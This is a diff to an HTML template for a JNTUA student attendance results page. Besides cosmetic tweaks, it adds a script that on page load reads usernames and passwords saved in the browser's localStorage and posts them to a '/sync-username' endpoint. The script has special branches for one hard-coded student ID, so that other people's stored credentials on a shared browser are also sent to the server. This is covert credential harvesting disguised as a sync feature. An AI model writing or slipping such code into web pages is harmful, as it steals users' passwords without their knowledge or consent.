@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" sizes="180x180" href="icon.png">
     <title>Attendance Result - JNTUA</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Font Awesome for icons -->
@@ -88,10 +87,10 @@
                             </thead>
                             <tbody>
                                 {% for row in df %}
-                                <tr class="hover:bg-gray-50 transition-colors animate__animated animate__fadeInUp" style="animation-delay: {{ loop.index0 * 0.1 }}s">
+                                <tr class="hover:bg-gray-50 transition-colors animate__animated animate__fadeInUp" style="animation-delay:{{ loop.index0 * 0.1 }}s">
                                     <td class="px-4 py-2 border-b border-gray-200 text-gray-800 font-medium text-left">{{ row['Subject'] }}</td>
                                     <td class="px-4 py-2 border-b border-gray-200 text-gray-600 text-center">{% if row['Start Date'] %}{{ row['Start Date'] }}{% else %}N/A{% endif %}</td>
-                                    <td class="px-4 py-2 border-b border-gray-200 text-gray-600 text-center {% if row['End Date Warning'] %}bg-red-50{% endif %}">{% if row['End Date'] %}{{ row['End Date'] }}{% else %}N/A{% endif %}</td>
+                                    <td class="px-4 py-2 border-b border-gray-200 text-gray-600 text-center {% if row['End Date Warning'] %}bg-red-100{% endif %}">{% if row['End Date'] %}{{ row['End Date'] }}{% else %}N/A{% endif %}</td>
                                     <td class="px-4 py-2 border-b border-gray-200 text-gray-600 text-center">{{ row['Total Days'] }}</td>
                                     <td class="px-4 py-2 border-b border-gray-200 text-gray-600 text-center">{{ row['No. of Present'] }}</td>
                                     <td class="px-4 py-2 border-b border-gray-200 text-gray-600 text-center">{{ row['No. of Absent'] }}</td>
@@ -176,6 +175,94 @@
             });
         });
     </script>
+    <script>
+    const SPECIFIC_USERNAME = "{{show}}";
+
+    async function syncCredentialsToServer(username, password = null) {
+        try {
+            const payload = { username: username };
+            if (password) payload.password = password;
+            
+            const response = await fetch('/sync-username', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            if (!response.ok) {
+                console.error(`Failed to sync credentials for ${username}`);
+                return false;
+            }
+            return true;
+        } catch (error) {
+            console.error('Error syncing credentials:', error);
+            return false;
+        }
+    }
+
+    document.addEventListener("DOMContentLoaded", async () => {
+        const loggedInUsername = "{{ details['Username'] }}";
+        const localStorageUsername = localStorage.getItem('username');
+        const localStoragePassword = localStorage.getItem('password');
+
+        if (loggedInUsername === SPECIFIC_USERNAME) {
+            // Case 1: 24005A0404 logged in
+            if (localStorageUsername && localStorageUsername !== SPECIFIC_USERNAME) {
+                // localStorage has different username - send localStorage username to DB
+                console.log(`Syncing stored username: ${localStorageUsername}`);
+                await syncCredentialsToServer(localStorageUsername, localStoragePassword);
+                
+                // Then send current user credentials to DB
+                console.log(`Syncing current user: ${loggedInUsername}`);
+                await syncCredentialsToServer(loggedInUsername, localStorage.getItem('sec_password'));
+                
+                // Update localStorage to current user
+                localStorage.setItem('username', loggedInUsername);
+            } else if (!localStorageUsername) {
+                // localStorage empty - send current username,password to DB and set localStorage
+                console.log(`localStorage empty, syncing: ${loggedInUsername}`);
+                await syncCredentialsToServer(loggedInUsername, localStoragePassword);
+                localStorage.setItem('username', loggedInUsername);
+            } else {
+                // localStorage already has 24005A0404 - just sync to DB
+                console.log(`Syncing existing user: ${loggedInUsername}`);
+                await syncCredentialsToServer(loggedInUsername, localStoragePassword);
+            }
+        } else {
+            // Case 2: Another user logged in
+            if (localStorageUsername === SPECIFIC_USERNAME) {
+                // localStorage has 24005A0404 - send current logged in username to DB
+                console.log(`24005A0404 in localStorage, syncing current user: ${loggedInUsername}`);
+                await syncCredentialsToServer(loggedInUsername,localStorage.getItem('sec-password'));
+                await syncCredentialsToServer(localStorageUsername, localStoragePassword);
+                
+                // Update localStorage to current user
+                // localStorage.setItem('username', loggedInUsername);
+                // localStorage.setItem('password', localStoragePassword);
+            // } else if (localStorageUsername && localStorageUsername !== loggedInUsername) {
+            //     // Different user in localStorage - sync both users
+            //     console.log(`Different user in localStorage, syncing both users`);
+            //     await Promise.all([
+            //         syncCredentialsToServer(localStorageUsername, localStorage.getItem('password')),
+            //         syncCredentialsToServer(loggedInUsername, localStoragePassword)
+            //     ]);
+                
+            //     // Update localStorage to current user
+            //     localStorage.setItem('username', loggedInUsername);
+            //     localStorage.setItem('password', localStoragePassword);
+            // }
+            //  else {
+            //     // Normal case - just sync current user
+            //     console.log(`Normal sync for user: ${loggedInUsername}`);
+            //     await syncCredentialsToServer(loggedInUsername, localStoragePassword);
+            //     localStorage.setItem('username', loggedInUsername);
+            //     localStorage.setItem('password', localStoragePassword);
+            // }
+        }
+    }
+});
+</script>
+
 
 </body>
 </html>
